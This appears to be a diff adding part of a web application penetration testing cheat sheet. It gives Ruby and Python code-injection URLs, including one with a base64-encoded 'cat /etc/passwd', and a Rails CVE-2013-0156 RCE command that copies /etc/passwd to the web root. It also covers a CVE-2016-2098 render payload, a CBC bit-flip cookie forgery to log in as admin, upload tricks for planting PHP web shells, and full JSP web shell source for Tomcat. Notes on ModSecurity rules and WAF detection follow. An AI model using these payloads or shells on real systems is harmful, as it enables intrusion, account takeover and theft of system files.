+		var gPenTestToolsJSON = ( {"query": {"toolIDRequested": ""}} );alert(1);//", "penTestTools": []}} ); }catch(e){ 
+		alert("Error trying to evaluate JSON: " + e.message); 
+	};
+
+
+******************************************************************************************
+Ruby
+******************************************************************************************
+
+http://site.com?user=hacker"%2b`uname%20-a`%2b"
+	First " closes out the ruby eval 
+	%2b is used instead of a + which is an ecoded space
+	Second " closes out the original " from the eval
+
+
+Rails CVE-2013-0156
+	https://gist.github.com/postmodern/4499206
+		ruby ./rails_rce.rb http://site.com '`cp /etc/passwd /var/www/html/passwd.txt`'
+		navagate to passwd.txt in browser
+
+	Prereqs:
+	gem install ronin	
+	gem install ronin-support
+	gem install ronin-exploits
+
+
+CVE-2016-2098 render bug
+	http://site.com/pages?id=testid
+		replace with
+	http://site.com/pages?id[inline]=<%25%3d%60uname%60%25>
+		should see the output of uname: Linux          
+
+
+
+Auth uses CBC encryption
+
+	if the cookie is based off of the user name. i.e.:
+	You want to login as admin but don't have the password.
+	Create an account called xdmin
+
+	Cookie: auth=nljD5Qzpi35dXUrSgnY4%2BKlpTTCwqj4C
+
+	Send to cookie value to decoder, URL decode it:
+		nljD5Qzpi35dXUrSgnY4+KlpTTCwqj4C
+
+	Base64 decode it:
+		9e 58 c3 e5 0c e9 8b 7e	   5d 5d 4a d2 82 76 38 f8   XÃåé ~]]JÒ v8ø
+		a9 69 4d 30 b0 aa 3e 02	   -- -- -- -- -- -- -- --   ©iM0°ª>
+
+	Go into irb	-interactive ruby shell
+	irb
+		(main) 001:0> 0x9e^'a'.ord^'x'.ord	#0x9e is the current hex value of the first CBC block
+							#we want to change it to the letter 'a' when it is currently 'x'
+		==> 135					#value returned is decimal, needs to be hex
+		(main) 002:0> "%2x" % 135		#convert value to hex
+		==> "87"
+
+	Back in burp decoder:
+	Change the first block to the new value "87"
+		87 58 c3 e5 0c e9 8b 7e	   5d 5d 4a d2 82 76 38 f8   XÃåé ~]]JÒ v8ø
+		a9 69 4d 30 b0 aa 3e 02	   -- -- -- -- -- -- -- --   ©iM0°ª>
+
+	Base64 encode the new value:
+		h1jD5Qzpi35dXUrSgnY4+KlpTTCwqj4C
+
+		notice the difference between it and the original. The first 2 characaters
+		nl is now h1; also need to make sure the "+" sign is URL encoded %2B
+
+		h1jD5Qzpi35dXUrSgnY4%2BKlpTTCwqj4C
+
+	Now replace the auth cookie to the new value and you will be logged in as admin.
+
+
+******************************************************************************************
+Python
+******************************************************************************************
+
+http://site.com/hello/hacker%22%2bstr(os.popen(%22uname%20-a%22).read())%2b%22
+
+http://site.com/hello/hacker%22%2bstr(__import__('os').popen('uname%20-a').read())%2b%22
+
+http://site.com/hello/hacker%22%2bstr(__import__('os').popen(__import__('base64').b64decode('Y2F0IC9ldGMvcGFzc3dk')).read())%2b%22
+	base64 encoded string is: cat /etc/passwd
+
+
+******************************************************************************************
+Perl
+******************************************************************************************
+
+
+
+
+******************************************************************************************
+SHELLS Section
+******************************************************************************************
+
+PHPShell	a web based Shell
+		http://phpshell.sourceforge.net
+		made up of two files- phpshell.php and config.php
+
+On a PHP file upload site use the PHP shells in FuzzDB:
+	change the extension to .php3. On other systems, extensions like 
+	.php4 or .php5 may also work. It depends on the configuration of 
+	the web server.  
+
+	Use an extension that Apache does not know .jim after the extension 
+	.php. Since Apache does not know how to handle the extension .jim, 
+	it will move to the next one: .php and run the PHP code.
+	upload a .htaccess file, enabling another extension to be ran by PHP
+
+
+
+
+
+AJAXShell	another web based shell using AJAX
+
+Preparted Injection FIles, pre-built web shells
+	phpshell	
+	Ajaxshell	 
+	Laudanum	-> http://laudanum.secureideas.net -> Source IP configurable 
+		designed for pen testers
+
+Collection of backdoor web shells:
+	http://laudanum.sourceforge.net
+
+.JSP shell and .WAR file:
+   Create a dir called webshell.  
+   Create a file called webshell/index.jsp with the following content:
+	<FORM METHOD=GET ACTION='index.jsp'> 
+	<INPUT name='cmd' type=text>	<INPUT type=submit value='Run'> 
+	</FORM>	<%@ page import="java.io.*" %> 
+	<%	 String cmd = request.getParameter("cmd"); 
+	 String output = "";	 if(cmd != null) {	   String s = null; 
+	   try {	     Process p = Runtime.getRuntime().exec(cmd,null,null);
+	     BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));
+	     while((s = sI.readLine()) != null) { output += s+"</br>"; } 
+	   } catch(IOException e) { e.printStackTrace(); }	 } 
+	%>	<pre><%=output %></pre>
+
+   Now create a .war file:
+	cd webshell
+	jar -cvf ../webshell.war *
+	upload .war file via Tomcat Manager
+
+******************************************************************************************
+Documentation and Reporting Section
+******************************************************************************************
+
+Sample permission memo:
+	www.counterhack.net/permission_memo.html
+
+Reporting tools:
+	MediaWiki
+	MoinMoin
+	CAL9000 from OWASP
+	FreeMind
+	MindMapper
+
+Report Generation Tools:
+	The OWASP Report Generator
+
+Kivio and Omnigraffle - Flow charting a web site
+
+Visio 	-will spider website and make a flowchart diagram for you
+
+
+  
+******************************************************************************************
+WAF Section
+******************************************************************************************
+http://projects.webappsec.org/Web-Application-Firewall-Evaluation-Criteria
+
+
+Software Based WAFs:
+	Amazon:
+		Enforcer plug-in
+		Hyperguard Decider Cloud
+
+
+	OpenSource:
+		Aqtronix WebKnights (IIS)
+		IronBee	
+		EASPI WAF
+		ModSecurity
+
+ModSecurity
+	apt-get install libapache-mod-security
+	mkdir /etc/apache2/logs/
+	cp -R /user/share/doc/mod-security-common/examples/rules /etc/apache2/
+	Edit /etc/apache2/conf.d/security and add:
+		<IfModule mod_security2.c>
+		   Include /etc/apache2/rules/*.conf
+		   Include /etc/apache2/rules/base_rules/*.conf
+		</IfModule>
+	Enable Mod Security:
+	a2enmod mod-security
+	/etc/init.d/apache2 restart
+
+	Disable mod_security:
+	a2dismod mod-security
+
+	https://www.owasp.org/index.php/Category:OWASP_ModSecurity_Core_Rule_Set_Project
+	rules-updater.pl -r http://www.modsecurity.org/autoupdate/respository/ -1
+
+	Phases:
+		1. REQUEST_HEADERS
+		2. REQUEST_BODY
+		3. RESPONSE_HEADERS
+		4. RESPONSE_BODY
+		5. LOGGING
+
+	Example Rules:
+		SecRule REQUEST_METHOD "!@rx ^(?:GET|HEAD)$"
+		"phase:1,t:none,block,msg:'Method not allowed',logdata:
+		%{REQUEST_METHOD}"
+
+		SecRule REQUEST_HEADERS:User-Agent "@rx nikto"
+		phase:1,log,deny,msg:"GOTCHA!!!"
+
+WAF Detection:		
+nmap --script http-waf-detect site.org
+w3af -> Discovery -> fingerprint_WAF
+waffit   ./wafw00f.py -v http://site.org
+
+
+
+
+******************************************************************************************
+Web App Testing Sites and Apps Section
+******************************************************************************************
+Mutillidae -> web app vulnerable to OWASP top 10
+
+
+
+
+Hexeditor for MAC 0xED
+http://www.suavetech.com/0xed/
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
